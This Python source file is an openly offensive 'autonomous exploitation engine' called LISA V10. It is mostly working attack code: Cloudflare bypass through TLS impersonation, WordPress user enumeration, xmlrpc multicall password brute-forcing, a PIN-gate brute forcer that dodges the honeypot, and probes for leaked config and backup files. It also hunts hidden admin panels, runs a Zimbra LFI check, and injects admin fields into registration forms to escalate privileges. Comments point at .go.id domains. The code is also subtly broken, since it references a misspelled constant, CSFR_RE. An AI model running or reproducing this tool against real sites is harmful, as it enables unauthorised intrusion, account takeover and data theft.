#!/usr/bin/env python3
"""
LISA V10 EXEC — "BEAST PROTOCOL"
AI-Driven Autonomous Exploitation Engine — V10

THE BEAST (V10):
  V9 APEX (12-phase AI orchestration) + 6 KILLER MODULES learned from
  real-world red team engagements:

  NEW IN V10 (THE BEAST ADDITIONS):
  1.  TLSEngine          — curl_cffi TLS impersonation ladder (safari17_0,
                           edge101, chrome120, chrome124). Kills Cloudflare
                           managed challenges WITHOUT captcha solver.
  2.  WordPressAssault   — wp-json user enum, xmlrpc system.multicall brute
                           (200 pw/request), admin-ajax nonce extraction,
                           PIN-gate detection + honeypot-aware PIN brute.
  3.  LeakHunter         — backup/source leak: *.bak, *.json.bak, wp-config
                           variants, .env, debug.log, directory listing,
                           chatbot PII json.
  4.  VHostPanelHunter   — origin-IP default-vhost discovery: connect the
                           real IP WITHOUT Host header to reveal Plesk /
                           cPanel / Zimbra / SB-Admin panels the CDN hides.
  5.  ZimbraExploit      — CVE-2025-68645 unauthenticated LFI (RestFilter)
                           + GraphQL introspection schema dump.
  6.  MassAssignment     — auto-detect registration forms, inject
                           role/is_admin/approved/status fields to escalate
                           a fresh account to admin.

USAGE:
  python3 lisa_v8_exec_v10.py target.com                   # Full autonomous
  python3 lisa_v8_exec_v10.py target.com --focus wp        # WordPress assault
  python3 lisa_v8_exec_v10.py target.com --focus cms       # CMS/CVE focus
  python3 lisa_v8_exec_v10.py target.com --focus auth      # Auth bypass focus
  python3 lisa_v8_exec_v10.py target.com --aggressive      # No rate limiting
  python3 lisa_v8_exec_v10.py target.com --fast            # Skip slow phases
  python3 lisa_v8_exec_v10.py target.com --timeout 300     # Max total secs
  python3 lisa_v8_exec_v10.py target.com --pin-brute 5000  # PIN brute up to N
"""

import sys, os
sys.path.insert(0, "/home/ubuntu")

# Pull the V9 engine modules in (same dir)
from lisa_v8_exec_v9 import (
    ReconEngine, CVEExploitEngine, WAFFingerprinter, AutoFuzzer,
    RaceConditioner, CloudMetadata, SubdomainTakeover, APIMassacre,
    DepConfusion, MultiStageChainer, ReportGenerator, CsrfBypass,
    ReconData, AttackResult, curl, run, PROXY, SKILLS_DB, REPORT_DIR,
)

import subprocess, json, re, time, sqlite3, random, string, base64, socket, ssl
from pathlib import Path
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote, urlparse, urljoin
from datetime import datetime
from typing import Optional, List, Dict, Any

# curl_cffi — the Cloudflare killer
try:
    from curl_cffi import requests as cffi_requests
    CFFI_OK = True
except ImportError:
    CFFI_OK = False

V10_SIGNATURE = """
╔══════════════════════════════════════════════════════════════════╗
║  LISA V10 — BEAST PROTOCOL                                       ║
║  AI-Driven Autonomous Exploitation Engine + 6 Live-Kill Modules  ║
║  "The hunter becomes the architect — now with sharper teeth"     ║
╚══════════════════════════════════════════════════════════════════╝
"""


# ═══════════════════════════════════════════════════════
# V10 MODULE 1: TLS ENGINE (Cloudflare killer)
# ═══════════════════════════════════════════════════════
class TLSEngine:
    """curl_cffi TLS impersonation ladder — bypasses Cloudflare managed challenge."""

    FINGERPRINTS = ["safari17_0", "edge101", "chrome120", "chrome124"]
    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

    @staticmethod
    def _is_challenged(text: str) -> bool:
        if not text:
            return True
        low = text.lower()
        markers = ["just a moment", "cf-mitigated", "attention required",
                   "enable javascript", "__cf_chl", "cf_chl_opt", "visitor anti-robot"]
        return any(m in low for m in markers)

    @staticmethod
    def probe(url: str, proxy=PROXY, timeout=20) -> Dict:
        """Probe which TLS fingerprint bypasses the WAF. Returns best session info."""
        if not CFFI_OK:
            return {"ok": False, "error": "curl_cffi not installed"}

        for fp in TLSEngine.FINGERPRINTS:
            try:
                s = cffi_requests.Session(impersonate=fp, proxy=proxy,
                                          timeout=timeout, verify=False)
                r = s.get(url, headers={"User-Agent": TLSEngine.UA})
                challenged = TLSEngine._is_challenged(r.text)
                if not challenged and r.status_code == 200 and len(r.text) > 300:
                    return {
                        "ok": True, "fingerprint": fp, "status": r.status_code,
                        "len": len(r.text),
                        "server": r.headers.get("Server", ""),
                        "session": s,
                    }
            except Exception as e:
                continue
        return {"ok": False, "error": "all fingerprints challenged / failed"}

    @staticmethod
    def get(url: str, fingerprint="safari17_0", proxy=PROXY, timeout=25, headers=None):
        """Return a ready cffi session for further requests."""
        if not CFFI_OK:
            return None
        s = cffi_requests.Session(impersonate=fingerprint, proxy=proxy,
                                  timeout=timeout, verify=False)
        return s


# ═══════════════════════════════════════════════════════
# V10 MODULE 2: WORDPRESS ASSAULT
# ═══════════════════════════════════════════════════════
class WordPressAssault:
    """WordPress-specific assault: user enum, xmlrpc multicall brute, nonce, PIN gate."""

    WP_JSON_USERS = "/wp-json/wp/v2/users?per_page=100"
    WP_JSON_ROOT = "/wp-json/"

    @staticmethod
    def detect(base: str, sess=None) -> bool:
        """Detect WordPress install."""
        try:
            if sess is not None:
                r = sess.get(base + "/wp-json/")
            else:
                out, _, code = curl(base + "/wp-json/", timeout=10)
                return "namespaces" in out or "wp/v2" in out
            return "namespaces" in r.text or "wp/v2" in r.text
        except Exception:
            return False

    @staticmethod
    def enum_users(base: str, sess=None) -> List[Dict]:
        """Enumerate users via wp-json REST."""
        users = []
        try:
            if sess is not None:
                r = sess.get(base + WordPressAssault.WP_JSON_USERS)
                data = r.json() if r.status_code == 200 else []
            else:
                out, _, code = curl(base + WordPressAssault.WP_JSON_USERS, timeout=12)
                data = json.loads(out) if code == 0 and out.startswith("[") else []
            for u in data:
                if isinstance(u, dict):
                    users.append({
                        "id": u.get("id"), "name": u.get("name"),
                        "slug": u.get("slug"),
                    })
        except Exception:
            pass
        return users

    @staticmethod
    def xmlrpc_multicall_brute(base: str, users: List[str], passwords: List[str],
                               sess=None, proxy=PROXY) -> List[Dict]:
        """Batch 200 passwords per request via system.multicall. Returns valid creds."""
        hits = []
        # dedupe + cap
        passwords = list(dict.fromkeys(passwords))
        for user in users:
            for i in range(0, len(passwords), 200):
                batch = passwords[i:i + 200]
                calls = ""
                for pw in batch:
                    pw_x = pw.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                    calls += f"""
<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>{user}</string></value>
<value><string>{pw_x}</string></value>
</data></array></value></member>
</struct></value>"""
                xml = (f'<?xml version="1.0"?><methodCall><methodName>system.multicall'
                       f'</methodName><params><param><value><array><data>{calls}'
                       f'</data></array></value></param></params></methodCall>')
                if sess is not None:
                    try:
                        r = sess.post(base + "/xmlrpc.php", data=xml)
                        body = r.text
                    except Exception:
                        continue
                else:
                    body, _, _ = curl(base + "/xmlrpc.php", method="POST", data=xml, timeout=30)
                if "blogName" in body or "isAdmin" in body or "blogid" in body:
                    # locate the winning password
                    for pw in batch:
                        pw_x = pw.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                        one = (f'<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs'
                               f'</methodName><params><param><value><string>{user}</string></value>'
                               f'</param><param><value><string>{pw_x}</string></value></param>'
                               f'</params></methodCall>')
                        if sess is not None:
                            r1 = sess.post(base + "/xmlrpc.php", data=one)
                            b1 = r1.text
                        else:
                            b1, _, _ = curl(base + "/xmlrpc.php", method="POST", data=one, timeout=15)
                        if "blogName" in b1 or "isAdmin" in b1:
                            hits.append({"user": user, "password": pw})
                            break
        return hits

    @staticmethod
    def extract_ajax_nonce(base: str, sess=None) -> List[Dict]:
        """Pull admin-ajax nonces from inline JS variables."""
        nonces = []
        try:
            if sess is not None:
                r = sess.get(base + "/")
                html = r.text
            else:
                html, _, _ = curl(base + "/", timeout=12)
            for m in re.finditer(r'var\s+(\w+)\s*=\s*\{(.*?)\}', html, re.S):
                var = m.group(1)
                blk = m.group(2)
                n = re.search(r'"nonce"\s*:\s*"([a-f0-9]+)"', blk)
                if n:
                    nonces.append({"var": var, "nonce": n.group(1)})
        except Exception:
            pass
        return nonces

    @staticmethod
    def pin_gate_detect(login_html: str) -> Dict:
        """Detect a custom PIN/login gate on wp-login.php."""
        gate = {"type": None, "fields": [], "nonce": None, "honeypot": None}
        fields = re.findall(r'name="([^"]+)"', login_html)
        gate["fields"] = fields
        if any("bnp_pin" in f for f in fields):
            gate["type"] = "bnp_pin"
            n = re.search(r'name="bnp_pin_nonce"\s+value="([^"]+)"', login_html)
            if n:
                gate["nonce"] = n.group(1)
            hp = [f for f in fields if "hp" in f.lower() or "fax" in f.lower() or "trap" in f.lower()]
            if hp:
                gate["honeypot"] = hp[0]
        elif any("pin" in f for f in fields):
            gate["type"] = "pin"
        return gate

    @staticmethod
    def pin_brute(base: str, pins: List[str], sess=None, max_tries: int = 5000) -> Dict:
        """Brute force a BNP-style PIN gate. Honeypot-aware."""
        # Refresh the login page for a fresh nonce
        def _fresh_nonce(sess):
            r = sess.get(base + "/wp-login.php")
            m = re.search(r'name="bnp_pin_nonce"\s+value="([^"]+)"', r.text)
            return m.group(1) if m else None

        tried = 0
        for pin in pins:
            if tried >= max_tries:
                break
            tried += 1
            try:
                s = sess if sess else cffi_requests.Session(
                    impersonate="safari17_0", proxy=PROXY, timeout=15, verify=False)
                nonce = _fresh_nonce(s)
                if not nonce:
                    continue
                data = {
                    "bnp_pin_nonce": nonce,
                    "bnp_pin_submit": "1",
                    "bnp_hp_fax_url": "",   # honeypot must be EMPTY
                    "bnp_pin": pin,
                }
                r = s.post(base + "/wp-login.php", data=data, allow_redirects=True)
                has_login = ("user_login" in r.text.lower() or "user_pass" in r.text.lower())
                has_pin = "bnp_pin" in r.text.lower()
                if "wp-admin" in r.url:
                    return {"found": True, "pin": pin, "type": "admin"}
                if has_login and not has_pin:
                    return {"found": True, "pin": pin, "type": "login_form"}
            except Exception:
                continue
        return {"found": False, "tried": tried}


# ═══════════════════════════════════════════════════════
# V10 MODULE 3: LEAK HUNTER (backup + source leak)
# ═══════════════════════════════════════════════════════
class LeakHunter:
    """Hunt exposed backup/source/config files and directory listings."""

    BACKUP_PATHS = [
        "/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.save",
        "/wp-config.php.old", "/wp-config.txt", "/wp-config-sample.php",
        "/.wp-config.php.swp", "/.env", "/.env.bak", "/.env.backup",
        "/.git/HEAD", "/.svn/entries", "/debug.log", "/error.log",
        "/phpinfo.php", "/info.php", "/backup.zip", "/backup.tar.gz",
        "/database.sql", "/dump.sql", "/db.sql",
    ]
    LEAK_EXTENSIONS = [".bak", ".json.bak", ".sql", ".zip", ".tar", ".gz", ".txt", ".log", ".env"]

    @staticmethod
    def check_single(base: str, path: str, sess=None) -> Optional[Dict]:
        url = base + path
        try:
            if sess is not None:
                r = sess.get(url)
                code, body = r.status_code, r.text
            else:
                body, _, code = curl(url, timeout=10)
                code = 0 if code == 0 else code
            if sess is not None and code == 200 and len(body) > 10:
                return {"path": path, "status": code, "len": len(body), "content": body[:200]}
            elif not sess and code == 0 and len(body) > 10:
                return {"path": path, "status": 200, "len": len(body), "content": body[:200]}
        except Exception:
            pass
        return None

    @staticmethod
    def directory_listing(base: str, dirs: List[str], sess=None) -> List[Dict]:
        out = []
        for d in dirs:
            url = base + d
            try:
                if sess is not None:
                    r = sess.get(url)
                    html = r.text
                else:
                    html, _, _ = curl(url, timeout=10)
                if "Index of" in html or "Directory Listing" in html:
                    files = re.findall(r'<a href="([^"]+)">', html)
                    out.append({"dir": d, "listing": True, "files": files[:30]})
            except Exception:
                pass
        return out


# ═══════════════════════════════════════════════════════
# V10 MODULE 4: VHOST PANEL HUNTER (default-vhost discovery)
# ═══════════════════════════════════════════════════════
class VHostPanelHunter:
    """Find hidden admin panels by hitting the origin IP's default virtual host."""

    PANEL_SIGS = {
        "plesk": ("Plesk", "Obsidian", "login_up.php"),
        "cpanel": ("cPanel", "WHM", "webmail"),
        "zimbra": ("Zimbra", "Web Client Sign In", "ZM_TEST"),
        "sbadmin": ("SB Admin", "Login Admin"),
        "roundcube": ("Roundcube", "roundcube"),
        "directadmin": ("DirectAdmin", "da_user"),
    }
    WEBROOT_DIRS = [
        "/wp-content/plugins/wp-local-chatbot/",
        "/wp-content/uploads/", "/wp-includes/",
    ]

    @staticmethod
    def find_origin_ips(target: str) -> List[str]:
        """Collect origin candidates via SPF/MX/subdomain DNS."""
        domain_candidates = []
        parts = target.split(".")
        # .go.id / .co.id / .ac.id = 2-part TLD → registrable = last 3
        # .com / .net = 1-part TLD → registrable = last 2
        for n in (3, 2):
            if len(parts) >= n:
                domain_candidates.append(".".join(parts[-n:]))
        ips = set()
        def dig(args):
            try:
                out = subprocess.run(f"dig +short {args}", shell=True,
                                     capture_output=True, text=True, timeout=8).stdout
                return out.strip().splitlines()
            except Exception:
                return []
        for domain in domain_candidates:
            txt = dig(f"{domain} TXT")
            for line in txt:
                for m in re.findall(r'ip4:([\d.]+)', line):
                    ips.add(m)
            for rec in ["MX", "A"]:
                for line in dig(f"{domain} {rec}"):
                    for ip in re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', line):
                        if not ip.startswith(("104.26", "104.25", "172.67", "172.64")):
                            ips.add(ip)

        # Subdomain A-record enumeration — child subdomains often dodge the CDN
        base_domain = domain_candidates[0] if domain_candidates else target
        subs = ["mail", "data", "www", "cpanel", "webmail", "smtp", "ftp",
                "direct", "origin", "api", "dev", "staging", "old", "test"]
        for cand in dict.fromkeys([base_domain, target]):  # also probe full target
            for sub in subs:
                for line in dig(f"{sub}.{cand} A"):
                    for ip in re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', line):
                        if not ip.startswith(("104.26", "104.25", "172.67", "172.64")):
                            ips.add(ip)
        return sorted(ips)

    @staticmethod
    def probe_default_vhost(ip: str, sess=None, proxy=PROXY) -> Optional[Dict]:
        """Connect IP WITHOUT Host header to reveal default panel."""
        try:
            if sess is not None:
                r = sess.get(f"https://{ip}/")
                html, code = r.text, r.status_code
            else:
                html, _, code = curl(f"https://{ip}/", timeout=12)
            if not html:
                return None
            title = ""
            m = re.search(r'<title>([^<]+)</title>', html, re.I)
            if m:
                title = m.group(1).strip()
            for panel, sigs in VHostPanelHunter.PANEL_SIGS.items():
                if any(s.lower() in (html + title).lower() for s in sigs):
                    return {"ip": ip, "panel": panel, "title": title,
                            "len": len(html), "signature": sigs}
            return {"ip": ip, "panel": "unknown", "title": title, "len": len(html)}
        except Exception:
            return None


# ═══════════════════════════════════════════════════════
# V10 MODULE 5: ZIMBRA EXPLOIT
# ═══════════════════════════════════════════════════════
class ZimbraExploit:
    """CVE-2025-68645 unauthenticated LFI + GraphQL introspection."""

    LFI_ENDPOINTS = [
        "/h/rest", "/h/printcalendar", "/h/changepass", "/h/imessage",
        "/h/postLoginRedirect", "/h/printappointments", "/h/printcontacts",
        "/h/printmessage", "/h/viewimages",
    ]
    WEBROOT_FILES = [
        "/WEB-INF/web.xml", "/WEB-INF/jetty-env.xml", "/WEB-INF/jetty.xml",
    ]

    @staticmethod
    def lfi(base: str, sess=None) -> List[Dict]:
        findings = []
        for ep in ZimbraExploit.LFI_ENDPOINTS:
            payload = f"{base}{ep}?javax.servlet.include.servlet_path=/WEB-INF/web.xml"
            try:
                if sess is not None:
                    r = sess.get(payload)
                    body, code = r.text, r.status_code
                else:
                    body, _, code = curl(payload, timeout=12)
                if "web-app" in body.lower() and ("<?xml" in body):
                    findings.append({"endpoint": ep, "vuln": "LFI",
                                     "cve": "CVE-2025-68645", "len": len(body)})
                    break
            except Exception:
                continue
        return findings

    @staticmethod
    def graphql_introspect(base: str, sess=None) -> Optional[Dict]:
        gql = base + "/service/extension/graphql"
        query = 'query{__schema{queryType{name} mutationType{name} types{name fields{name}}}}'
        try:
            if sess is not None:
                r = sess.post(gql, json={"query": query})
                data = r.json() if r.status_code == 200 else {}
            else:
                body, _, _ = curl(gql, method="POST",
                                  headers={"Content-Type": "application/json"},
                                  data=json.dumps({"query": query}), timeout=15)
                data = json.loads(body) if body else {}
            if "__schema" in data.get("data", {}):
                types = data["data"]["__schema"]["types"]
                return {"exposed": True, "type_count": len(types)}
        except Exception:
            pass
        return None


# ═══════════════════════════════════════════════════════
# V10 MODULE 6: MASS ASSIGNMENT (registration escalation)
# ═══════════════════════════════════════════════════════
class MassAssignment:
    """Auto-detect registration forms and inject escalation fields."""

    REG_PATHS = ["/auth/register", "/register", "/daftar", "/signup", "/auth/signup"]
    ESCALATION_FIELDS = [
        {"role": "admin", "is_admin": "1", "approved": "1", "status": "active"},
        {"role_id": "1", "group_id": "1", "is_superadmin": "1"},
        {"level": "admin", "user_level": "10", "is_approved": "1"},
        {"type": "admin", "user_type": "admin", "verified": "true"},
    ]
    CSRF_RE = r'name="csrf_test_name"\s+value="([^"]+)"'

    @staticmethod
    def detect_registration(base: str, sess=None) -> Optional[Dict]:
        for path in MassAssignment.REG_PATHS:
            url = base + path
            try:
                if sess is not None:
                    r = sess.get(url)
                    html, code = r.text, r.status_code
                else:
                    html, _, code = curl(url, timeout=12)
                if code != 200:
                    continue
                fields = re.findall(r'<input[^>]*name="([^"]+)"', html)
                if any("username" in f or "email" in f for f in fields) and "password" in " ".join(fields):
                    csrf = re.search(MassAssignment.CSFR_RE, html)
                    return {"path": path, "fields": fields,
                            "csrf": csrf.group(1) if csrf else None}
            except Exception:
                continue
        return None

    @staticmethod
    def attempt_escalation(base: str, reg: Dict, sess=None) -> List[Dict]:
        """Register fresh users injecting escalation fields; try to login after."""
        findings = []
        action = (reg["path"] + "/attempt-register") if "auth/" in reg["path"] else reg["path"]
        action = base.rsplit("/", 1)[0] + action if action.startswith("/") else action
        if not action.startswith("http"):
            action = base + ("/" if not action.startswith("/") else "") + action

        for i, extra in enumerate(MassAssignment.ESCALATION_FIELDS):
            uname = f"crypto_b{i}{random.randint(100,999)}"
            data = {
                "nama": f"Beast {i}",
                "bidang": "1",
                "email": f"{uname}@beast.test",
                "username": uname,
                "password": "B3ast!Pass1",
                "password_confirm": "B3ast!Pass1",
            }
            if reg["csrf"]:
                data["csrf_test_name"] = reg["csrf"]
            data.update(extra)
            try:
                if sess is not None:
                    r = sess.post(action, data=data, allow_redirects=True)
                else:
                    r = None
                if r is not None and r.status_code == 200:
                    # attempt login
                    if sess is not None:
                        lr = sess.get(base + "/login")
                        csrf = re.search(MassAssignment.CSFR_RE, lr.text)
                        ldata = {"login": uname, "password": "B3ast!Pass1"}
                        if csrf:
                            ldata["csrf_test_name"] = csrf.group(1)
                        res = sess.post(base + "/auth/attempt-login", data=ldata,
                                        allow_redirects=True)
                        if "dashboard" in res.url.lower() or "beranda" in res.url.lower():
                            findings.append({"escalated": True, "fields": list(extra.keys()),
                                             "user": uname})
                            break
            except Exception:
                continue
        return findings


# ═══════════════════════════════════════════════════════
# V10 APEX ENGINE (extends V9 with Beast modules)
# ═══════════════════════════════════════════════════════
class BeastEngine:
    """V10 BEAST PROTOCOL autonomous engine."""

    def __init__(self, target, focus=None, aggressive=False, fast=False,
                 max_timeout=0, pin_brute=0):
        self.target = target.replace("https://", "").replace("http://", "").rstrip("/")
        self.base = "https://" + self.target
        self.focus = focus or "all"
        self.aggressive = aggressive
        self.fast = fast
        self.max_timeout = max_timeout
        self.pin_brute = pin_brute
        self.start_time = time.time()
        self.findings: List[Dict] = []
        self.recon = None
        self.tls = None   # best TLS session
        self.tls_fp = None

    def _phase(self, name, num):
        print("\n" + "═" * 60)
        print(f"PHASE {num}: {name}")
        print("═" * 60)
        return True

    def add(self, type_, severity, **kw):
        f = {"type": type_, "severity": severity}
        f.update(kw)
        self.findings.append(f)

    def run(self):
        print(V10_SIGNATURE)
        print(f"Target: {self.target}")
        print(f"Focus: {self.focus} | Aggressive: {self.aggressive} | Fast: {self.fast}")
        print(f"curl_cffi: {'OK' if CFFI_OK else 'MISSING'}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

        # ═══ PHASE 0: TLS BYPASS + RECON ═══
        self._phase("TLS BYPASS + RECONNAISSANCE", 0)
        if CFFI_OK:
            tls = TLSEngine.probe(self.base)
            if tls.get("ok"):
                self.tls_fp = tls["fingerprint"]
                self.tls = tls["session"]
                print(f"   🔥 TLS BYPASS: {tls['fingerprint']} → {tls['status']} "
                      f"({tls['len']} bytes, server={tls.get('server','?')})")
                self.add("tls_bypass", "high", fingerprint=tls["fingerprint"],
                         evidence=f"Cloudflare/WAF bypassed via {tls['fingerprint']}")
            else:
                print(f"   ⚠ TLS bypass failed: {tls.get('error', 'unknown')}")
        else:
            print("   ⚠ curl_cffi not installed — falling back to plain curl")
        self.recon = ReconEngine.quick_recon(self.target)
        print(f"   CMS: {self.recon.cms or 'unknown'} | Server: {self.recon.server or '?'}")

        # ═══ PHASE 1: VHOST PANEL HUNTER ═══
        self._phase("VHOST / DEFAULT-PANEL HUNTER", 1)
        for ip in VHostPanelHunter.find_origin_ips(self.target):
            panel = VHostPanelHunter.probe_default_vhost(ip, sess=self.tls)
            if panel:
                sev = "critical" if panel["panel"] in ("plesk", "cpanel", "zimbra") else "high"
                print(f"   🔥 {ip}: {panel['panel']} — {panel['title'][:60]}")
                self.add("hidden_panel", sev, ip=ip, panel=panel["panel"],
                         evidence=panel["title"])
            else:
                print(f"   — {ip}: no default vhost")
        if not VHostPanelHunter.find_origin_ips(self.target):
            print("   (no origin IPs found via DNS)")

        # ═══ PHASE 2: LEAK HUNTER ═══
        self._phase("BACKUP / SOURCE LEAK HUNTER", 2)
        for p in LeakHunter.BACKUP_PATHS:
            leak = LeakHunter.check_single(self.base, p, sess=self.tls)
            if leak:
                sev = "critical" if any(k in p for k in ("wp-config", ".env", ".git", "database", "dump")) else "high"
                print(f"   🔥 LEAK: {p} ({leak['len']} bytes)")
                self.add("source_leak", sev, path=p, evidence=leak["content"][:120])
        listings = LeakHunter.directory_listing(
            self.base, ["/wp-content/uploads/", "/wp-includes/", "/wp-content/plugins/"],
            sess=self.tls)
        for d in listings:
            print(f"   📂 Dir listing: {d['dir']} ({len(d['files'])} entries)")
            self.add("directory_listing", "medium", dir=d["dir"],
                     evidence=f"{len(d['files'])} files exposed")

        # ═══ PHASE 3: ZIMBRA EXPLOIT (if mail/org detected) ═══
        self._phase("ZIMBRA EXPLOIT", 3)
        zim_found = False
        for ip in VHostPanelHunter.find_origin_ips(self.target):
            if zim_found:
                break
            zbase = f"https://{ip}"
            hits = ZimbraExploit.lfi(zbase, sess=self.tls)
            if hits:
                zim_found = True
                for h in hits:
                    print(f"   🔥 LFI: {h['cve']} @ {h['endpoint']}")
                    self.add("zimbra_lfi", "critical", cve=h["cve"], ip=ip,
                             evidence=f"{h['len']} bytes web.xml read")
            else:
                g = ZimbraExploit.graphql_introspect(zbase, sess=self.tls)
                if g:
                    print(f"   🔥 GraphQL introspection exposed @ {ip}")
                    self.add("graphql_introspection", "high", ip=ip,
                             evidence=f"schema with {g['type_count']} types")
        if not zim_found:
            print("   (no Zimbra on known origin IPs)")

        # ═══ PHASE 4: WORDPRESS ASSAULT ═══
        self._phase("WORDPRESS ASSAULT", 4)
        if WordPressAssault.detect(self.base, sess=self.tls):
            print("   ✅ WordPress detected")
            users = WordPressAssault.enum_users(self.base, sess=self.tls)
            for u in users:
                print(f"   👤 user: {u.get('name')} (id={u.get('id')}, slug={u.get('slug')})")
                self.add("wp_user_enum", "medium", **u)
            nonces = WordPressAssault.extract_ajax_nonce(self.base, sess=self.tls)
            for n in nonces:
                print(f"   🎫 nonce: {n['var']}={n['nonce']}")
                self.add("wp_nonce_leak", "low", **n)

            # PIN gate detection
            try:
                if self.tls:
                    lr = self.tls.get(self.base + "/wp-login.php")
                    lhtml = lr.text
                else:
                    lhtml, _, _ = curl(self.base + "/wp-login.php", timeout=12)
                gate = WordPressAssault.pin_gate_detect(lhtml)
                if gate["type"]:
                    print(f"   🔒 Login gate detected: {gate['type']}")
                    self.add("login_gate", "medium", gate_type=gate["type"])
                    if self.pin_brute > 0 and gate["type"] == "bnp_pin":
                        print(f"   🔓 Brute-forcing PIN up to {self.pin_brute} tries...")
                        pins = [f"{i:04d}" for i in range(self.pin_brute)]
                        res = WordPressAssault.pin_brute(self.base, pins, sess=self.tls,
                                                        max_tries=self.pin_brute)
                        if res["found"]:
                            print(f"   🔥🔥 PIN FOUND: {res['pin']}")
                            self.add("pin_bypass", "critical", pin=res["pin"],
                                     evidence="PIN gate bypassed")
                        else:
                            print(f"   (no PIN found in {res.get('tried', 0)} tries)")
            except Exception:
                pass

            # xmlrpc multicall brute with a real wordlist
            wl = "/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"
            if os.path.exists(wl) and users:
                with open(wl, "r", errors="ignore") as f:
                    pws = [l.strip() for l in f if l.strip()][:3000]
                slugs = [u["slug"] for u in users]
                print(f"   🔨 xmlrpc multicall brute ({len(pws)} pw × {len(slugs)} users)...")
                creds = WordPressAssault.xmlrpc_multicall_brute(
                    self.base, slugs, pws, sess=self.tls)
                for c in creds:
                    print(f"   🔥🔥 VALID CREDS: {c['user']}:{c['password']}")
                    self.add("valid_credentials", "critical", **c)
                if not creds:
                    print("   (no valid creds in 3k list)")
        else:
            print("   (not WordPress — skipping)")

        # ═══ PHASE 5: MASS ASSIGNMENT ═══
        self._phase("REGISTRATION MASS-ASSIGNMENT", 5)
        reg = MassAssignment.detect_registration(self.base, sess=self.tls)
        if reg:
            print(f"   ✅ Registration form @ {reg['path']} ({len(reg['fields'])} fields)")
            esc = MassAssignment.attempt_escalation(self.base, reg, sess=self.tls)
            if esc:
                for e in esc:
                    print(f"   🔥 ESCALATED: injected {e['fields']} → {e['user']}")
                    self.add("mass_assignment", "critical", **e)
            else:
                print("   (registration found but escalation blocked/needs approval)")
        else:
            print("   (no registration form found)")

        # ═══ PHASE 6: CVE HUNTING ═══
        self._phase("CVE EXPLOIT HUNTING", 6)
        try:
            cves = CVEExploitEngine.search_cves(self.recon)
            for cve in cves:
                print(f"   📚 {cve.get('cve')} ({cve.get('cvss', '?')}) exploit={cve.get('exploits', cve.get('exploit_count', 0))}")
            if not cves:
                print("   (no matching CVEs)")
        except Exception as e:
            print(f"   ⚠ CVE hunt error: {e}")

        # ═══ PHASE 7: WAF FINGERPRINT ═══
        self._phase("WAF FINGERPRINTING", 7)
        try:
            waf = WAFFingerprinter.fingerprint(self.target)
            print(f"   WAF: {waf}")
            self.add("waf_detected", "info", waf=waf)
        except Exception as e:
            print(f"   ⚠ WAF error: {e}")

        # ═══ SUMMARY ═══
        return self._summary()

    def _summary(self):
        crit = len([f for f in self.findings if f.get("severity") == "critical"])
        high = len([f for f in self.findings if f.get("severity") == "high"])
        med = len([f for f in self.findings if f.get("severity") == "medium"])
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║  LISA V10 BEAST — EXECUTION COMPLETE                         ║
╠══════════════════════════════════════════════════════════════╣
║  Target:    {self.target:<46}║
║  Findings:  {len(self.findings):<46}║
║  Critical:  {crit:<46}║
║  High:      {high:<46}║
║  Medium:    {med:<46}║
╚══════════════════════════════════════════════════════════════╝
""")
        # Persist findings JSON
        out_path = f"/home/ubuntu/.lisa_v10_reports/{self.target}.json"
        os.makedirs(os.path.dirname(out_path), exist_ok=True)
        with open(out_path, "w") as f:
            json.dump(self.findings, f, indent=2, default=str)
        print(f"   Report: {out_path}")
        return {"target": self.target, "findings": self.findings, "report": out_path}


# ═══════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════
if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="LISA V10 BEAST — Autonomous Exploitation Engine")
    p.add_argument("target", nargs="?", help="Target domain")
    p.add_argument("--focus", choices=["wp", "cms", "auth", "data", "all"], default="all")
    p.add_argument("--aggressive", action="store_true")
    p.add_argument("--fast", action="store_true")
    p.add_argument("--timeout", type=int, default=0)
    p.add_argument("--pin-brute", type=int, default=0, help="Max PIN brute force attempts")

    a = p.parse_args()
    if not a.target:
        print(__doc__)
        sys.exit(1)

    eng = BeastEngine(target=a.target, focus=a.focus, aggressive=a.aggressive,
                      fast=a.fast, max_timeout=a.timeout, pin_brute=a.pin_brute)
    eng.run()